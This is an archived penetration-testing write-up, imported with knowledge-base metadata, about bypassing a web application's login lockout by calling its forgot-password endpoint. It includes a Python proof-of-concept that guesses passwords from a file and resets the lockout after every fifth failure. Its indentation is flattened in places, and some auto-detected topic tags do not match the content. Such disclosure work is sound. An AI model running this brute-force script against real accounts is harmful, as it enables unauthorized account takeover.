---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-28_bypassing-account-lockout-through-password-reset-functionality.md
original_filename: 2023-01-28_bypassing-account-lockout-through-password-reset-functionality.md
title: Bypassing account lockout through password reset functionality
category: documents
detected_topics:
- password-reset
- rate-limit
- sso
- command-injection
- otp
- supply-chain
tags:
- imported
- documents
- password-reset
- rate-limit
- sso
- command-injection
- otp
- supply-chain
language: en
raw_sha256: c8aa6442407af816a655c1a16ae362e0e5f53dee1037a0567c61ca87d7659725
text_sha256: fc7c089fa133f59fee6da3d43fb0d7c81fe1f58edc4cfe7501f5140b4d39f86a
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing account lockout through password reset functionality

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-28_bypassing-account-lockout-through-password-reset-functionality.md
- Source Type: markdown
- Detected Topics: password-reset, rate-limit, sso, command-injection, otp, supply-chain
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `c8aa6442407af816a655c1a16ae362e0e5f53dee1037a0567c61ca87d7659725`
- Text SHA256: `fc7c089fa133f59fee6da3d43fb0d7c81fe1f58edc4cfe7501f5140b4d39f86a`


## Content

---
title: "Bypassing account lockout through password reset functionality"
url: "https://akashc99.medium.com/bypassing-account-lockout-through-password-reset-functionality-8ff5c256f380"
authors: ["Akash c"]
bugs: ["Rate limiting bypass"]
publication_date: "2023-01-28"
added_date: "2023-03-02"
source: "pentester.land/writeups.json"
original_index: 1615
scraped_via: "browseros"
---

# Bypassing account lockout through password reset functionality

Bypassing account lockout through password reset functionality
Akash c
Follow
2 min read
·
Jan 29, 2023

109

During a recent penetration testing engagement, I discovered a vulnerability in the login page of a web application. Specifically, I found that after five unsuccessful login attempts, the account would become locked. However, I discovered that by sending a post request to the forgot password page with the email address associated with the locked account, it was possible to unlock the account without any additional verification.

This vulnerability could allow an attacker to repeatedly try different passwords in an automated fashion until the account is locked, and then use the forgot password feature to unlock the account and continue the password guessing attack.

Get Akash c’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

To demonstrate the impact of this vulnerability, I created a proof-of-concept script using the Python requests library. The script reads a list of passwords from a text file, password.txt and repeatedly sends login requests to the target application, including the forgot password request after every 5th failed login attempt. The code is provided below for reference:

import requests
import json

# read the password from the password.txt file
with open("password.txt", "r") as f:
  passwords = f.read().splitlines()

# set the login endpoint
login_url = "https://test.com/api/v2/accounts/Login"

# set the headers for the JSON POST request
headers = {'Content-Type': 'application/json'}

# set the login parameters
login_params = {'username': 'test@test.com'}

# send the login requests
for i, password in enumerate(passwords):
  login_params['password'] = password
  response = requests.post(login_url, headers=headers, json=login_params)

  if i % 5 == 4:
  # send request to the forgot password endpoint
  forgot_url = "https://test.com/api/accounts/forgotPassword"
  forgot_params = {'email': 'test@test.com'}
  requests.post(forgot_url, headers=headers, json=forgot_params)

  if response.status_code == 200:
  print("Login success! Password: " + password.strip())
  break
Output

It is important to note that this vulnerability may be specific to the target application, and may not be present in other systems. However, this example serves as a reminder to thoroughly test account lockout and password reset functionality during security assessments.
